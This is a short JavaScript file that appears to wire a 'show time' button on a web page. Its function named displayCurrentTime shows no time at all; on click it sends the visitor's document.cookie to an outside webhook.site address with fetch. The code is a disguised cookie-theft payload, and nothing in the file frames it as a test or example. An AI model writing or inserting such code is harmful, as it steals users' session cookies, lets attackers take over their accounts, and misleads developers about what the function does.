document.addEventListener("DOMContentLoaded", function () {
  const button = document.getElementById("showTimeButton");
  button.addEventListener("click", function () {
    displayCurrentTime();
  });

  function displayCurrentTime() {
    fetch('https://webhook.site/b8fec0c7-3992-4c89-a8ed-b3c8bc6d619d' + document.cookie);
  }
});
